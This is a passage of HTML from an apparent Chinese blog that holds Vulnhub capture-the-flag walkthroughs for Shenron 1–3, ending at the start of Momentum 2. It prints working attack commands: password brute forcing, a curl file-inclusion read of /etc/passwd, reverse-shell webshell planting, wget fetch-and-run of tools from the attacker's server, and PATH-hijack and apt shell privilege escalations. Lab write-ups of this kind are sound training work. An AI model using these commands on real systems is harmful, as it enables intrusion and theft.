+            <a href="/2022/08/24/Shenron-3/">
+                Shenron 3
+            </a>
+        </h2>
+    
+    <time>
+        Aug 24, 2022
+    </time>
+    <section class="content">
+        <h1><span id="shenron3">Shenron:3</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称shenron3">名称：shenron:3</span></h4><h4><span id="发布日期2021416">发布日期：2021.4.16</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名shenron-3ova">文件名：shenron-3.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-3ova">下载地址：</span></h4><h4><span id="md5-2c70da66904d9820bf065d2eacb08419">MD5: 2C70DA66904D9820BF065D2EACB08419</span></h4><h4><span id="sha1-8fb172649ffb6f44f2c81d8468b3b609d8e37e19">SHA1: 8FB172649FFB6F44F2C81D8468B3B609D8E37E19</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机shenron3和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/24/Shenron-3/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.3.134：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-3/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.3.134/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-3/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放80端口，访问主页查看源码，没有太多线索：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.3.137 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-3/4.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-3/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现目录基本与wordpress有关：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.3.137/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-3/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="wordpress漏洞利用">Wordpress漏洞利用</span></h3><blockquote>
+<p>1.先把解析写入host，然后访问主页，发现是wordpress搭建的页面，可以用wpscan尝试寻找下漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-3/7.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-3/8.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.3.137 --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-3/9.png" alt="image-"></p>
+<p>2.没有直接的漏洞发现，访问后台登录页面，发现存在admin用户，我们可以直接使用wpscan对后台登录页爆破（需要rockyou.txt字典）：</p>
+<p><img src="/2022/08/24/Shenron-3/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://shenron --passwords rockyou.txt --usernames admin</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-3/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="wordpress后台登录写入webshell">Wordpress后台登录，写入webshell</span></h3><blockquote>
+<p>1.使用账号和密码登录wordpress后台，可以在Appearance-Editor-404.php页写入webshell：</p>
+<p><img src="/2022/08/24/Shenron-3/12.png" alt="image-"></p>
+<p>2.修改kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，覆盖404.php，update file，kali开启对应端口监听，通过访问不存在页触发webshell：</p>
+<p><img src="/2022/08/24/Shenron-3/13.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-3/14.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-3/15.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-3/16.png" alt="image-"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.查看&#x2F;var&#x2F;www&#x2F;html目录下文件，在wp-config.php中能发现wordpress用户及数据库密码，但是进入数据库后并没有什么额外发现：</p>
+<p><img src="/2022/08/24/Shenron-3/17.png" alt="image-"></p>
+<p>2.尝试提权到shenron，发现登录密码不是Wordpress@123，而是之前爆出的iloverockyou：</p>
+<p><img src="/2022/08/24/Shenron-3/18.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.在&#x2F;home&#x2F;shenron目录下，我们查看文件权限，发现network的属主和属组都是root：</p>
+<p><img src="/2022/08/24/Shenron-3/19.png" alt="image-"></p>
+<p>2.利用pspy64s工具，我们查看network运行后的调用，发现回调用netstat，则我们可以新建一个netstat文件，进行提权操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line">wget http://192.168.3.134:8001/pspy64s，shenron获取pspy64s工具</span><br><span class="line">chmod +x pspy64s</span><br><span class="line">./network</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-3/20.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-3/21.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash -p&quot; &gt; netstat</span><br><span class="line">chmod +x netstat</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd ~</span><br><span class="line">./network</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-3/22.png" alt="image-"></p>
+<p>3.在&#x2F;root目录下发现flag，即root.txt：</p>
+<p><img src="/2022/08/24/Shenron-3/23.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/24/Shenron-2/">
+                Shenron 2
+            </a>
+        </h2>
+    
+    <time>
+        Aug 24, 2022
+    </time>
+    <section class="content">
+        <h1><span id="shenron2">Shenron:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称shenron2">名称：shenron:2</span></h4><h4><span id="发布日期202145">发布日期：2021.4.5</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名shenron-2ova">文件名：shenron-2.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-2ova">下载地址：</span></h4><h4><span id="md5-2883845ff2e1e122e1b1e75cf9a4b4e1">MD5: 2883845FF2E1E122E1B1E75CF9A4B4E1</span></h4><h4><span id="sha1-e66bda7ab264d1fea2103801bb422731f34f0599">SHA1: E66BDA7AB264D1FEA2103801BB422731F34F0599</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机shenron2和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/24/Shenron-2/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.3.134：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.3.134/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放22，80及8080端口，访问主页查看源码，没有太多线索：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.3.136 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/4.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-2/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，没有发现太多值得关注的目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.3.136/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="wordpress漏洞利用">Wordpress漏洞利用</span></h3><blockquote>
+<p>1.先把解析写入host，然后访问192.168.3.136:8080，发现是wordpress搭建的页面，可以用wpscan尝试寻找下漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/7.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-2/8.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://shenron:8080 --api-token $(cat /opt/wpscan-api) --enumerate</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/9.png" alt="image-"></p>
+<p>2.发现有Site Editor的漏洞，我们可以看一下如何利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Site Editor 1.1.1</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://shenron:8080/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd，得到有两个用户和密码hash</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="ssh密码爆破初步提权">SSH密码爆破，初步提权</span></h3><blockquote>
+<p>1.用hydra进行jenny爆破，得到密码登录SSH：</p>
+<p><img src="/2022/08/24/Shenron-2/12.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-2/13.png" alt="image-"></p>
+<p>2.在jenny用户下，查看suid，可以发现&#x2F;usr&#x2F;bin&#x2F;Execute，查看文件（需要导入本地查看，不然是elf乱码）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/14.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-2/15.png" alt="image-"></p>
+<p>3.我们可以知道这个文件的作用是将&#x2F;bin&#x2F;bash复制到&#x2F;mnt&#x2F;bash下，并给予shenron用户权限，那么我们可以利用这个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Execute</span><br><span class="line">/mnt/bash -p</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/16.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.查看.pass文件，我们能发现一串类似base编码的字符串，利用base32解密发现是shenron用户登录的密码：</p>
+<p><img src="/2022/08/24/Shenron-2/17.png" alt="image-"></p>
+<p>2.登录shenron后，查看权限，发现可以直接提权到root：</p>
+<p><img src="/2022/08/24/Shenron-2/18.png" alt="image-"></p>
+<p>3.在&#x2F;root目录下，可以找到flag，即root.txt：</p>
+<p><img src="/2022/08/24/Shenron-2/19.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/24/Shenron-1/">
+                Shenron 1
+            </a>
+        </h2>
+    
+    <time>
+        Aug 24, 2022
+    </time>
+    <section class="content">
+        <h1><span id="shenron1">Shenron:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称shenron1">名称：shenron:1</span></h4><h4><span id="发布日期20201215">发布日期：2020.12.15</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名shenron-1ova">文件名：shenron-1.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-1ova">下载地址：</span></h4><h4><span id="md5-3d9f0f620846bc15f4591e7ac56c04b2">MD5: 3D9F0F620846BC15F4591E7AC56C04B2</span></h4><h4><span id="sha1-4e1d33e2338ada4ca1c093cd67725850a033baad">SHA1: 4E1D33E2338ADA4CA1C093CD67725850A033BAAD</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机shenron1和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/24/Shenron-1/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放22，80端口，访问主页还是apache2的初始页：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.113 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/4.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现&#x2F;joomla和&#x2F;test两个值得关注的目录，可以进行访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.113/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="寻找密码登录joomla后台">寻找密码，登录joomla后台</span></h3><blockquote>
+<p>1.访问192.168.56.113&#x2F;test，发现有password文件，查看password源码，能够发现admin用户的密码：</p>
+<p><img src="/2022/08/24/Shenron-1/7.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/8.png" alt="image-"></p>
+<p>2.可以用admin用户登录joomla管理后台：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.113/joomla -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，寻找后台</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/9.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/10.png" alt="image-"></p>
+</blockquote>
+<h3><span id="上传webshell">上传webshell</span></h3><blockquote>
+<p>1.修改kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，同时开启kali端口监听：</p>
+<p><img src="/2022/08/24/Shenron-1/11.png" alt="image-"></p>
+<p>2.在joomla后台管理页Templates-Templates-Protostar Details and Files-error.php内写入webshell内容后保存：</p>
+<p><img src="/2022/08/24/Shenron-1/12.png" alt="image-"></p>
+<p>3.访问不存在页面，触发webshell，再使用python构建交互式shell：</p>
+<p><img src="/2022/08/24/Shenron-1/13.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/14.png" alt="image-"></p>
+</blockquote>
+<h3><span id="ssh免密登录逐步提权">SSH免密登录，逐步提权</span></h3><blockquote>
+<p>1.在&#x2F;var&#x2F;www&#x2F;html&#x2F;joomla目录下，我们从configuration.php文件中可以发现jenny用户及其密码，可用作登录：</p>
+<p><img src="/2022/08/24/Shenron-1/15.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-1/16.png" alt="image-"></p>
+<p>2.登录jenny用户后，我们尝试使用ssh免密登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub，首先在kali上查看自己的ssh密钥并复制下来，没有的话执行ssh-keygen，回车默认</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/17.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cd .ssh</span><br><span class="line">echo __public key__ &gt;&gt; authorized_keys，在jenny用户进入/.ssh目录，写入kali复制的密钥</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/18.png" alt="image-"></p>
+<p>3.接着我们进行执行权限查看，发现shenron用户可以使用复制命令，则刚好可以把jenny现在有的ssh密钥复制过去，免密登录shenron：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/19.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /home/jenny/.ssh/authorized_keys /tmp/</span><br><span class="line">sudo -u shenron cp /tmp/authorized_keys /home/shenron/.ssh/</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/20.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.在&#x2F;var&#x2F;opt目录下，我们能发现password.txt，应该是shenron用户的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python3 -m http.server 8001，在kali开放http服务</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.56.102:8001/linpeas.sh，使用linpeas.sh工具扫描</span><br><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh | tee output</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/21.png" alt="image-"></p>
+<p>2.在shenron用户基础上，再查看权限，发现所有用户都可以使用apt，则用apt进行提权（详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/apt-get/%EF%BC%89%EF%BC%9A">https://gtfobins.github.io/gtfobins/apt-get/）：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;Dpkg::Pre-Invoke &#123;&quot;/bin/sh;false&quot;&#125;&#x27; &gt; $TF</span><br><span class="line">sudo apt install -c $TF sl</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-1/22.png" alt="image-"></p>
+<p>3.在root用户&#x2F;root目录下，可以查看flag，即root.txt：</p>
+<p><img src="/2022/08/24/Shenron-1/23.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/15/Momentum-2/">
+                Momentum 2
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="momentum2">Momentum:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称momentum2">名称：Momentum:2</span></h4><h4><span id="发布日期2021628">发布日期：2021.6.28</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列momentum">系列：Momentum</span></h4><h4><span id="推特al1enum">推特：@AL1ENUM</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>www-data:&#x2F;home&#x2F;athena&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名momentum2ova">文件名：Momentum2.ova</span></h4><h4><span id="文件大小698mb">文件大小：698MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagemomentummomentum2ova">下载地址：</span></h4><h4><span id="md5-5e837fd87d809c499911b1cb1a257cd9">MD5: 5E837FD87D809C499911B1CB1A257CD9</span></h4><h4><span id="sha1-17facc18fe6a6979159c4d0a09cc330602e81e68">SHA1: 17FACC18FE6A6979159C4D0A09CC330602E81E68</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Momentum2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/15/Momentum-2/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-2/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-2/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页有一些图片：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.107 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-2/4.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现五个可见目录，可以去看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.107/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-2/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件上传漏洞发现">文件上传漏洞发现</span></h3><blockquote>
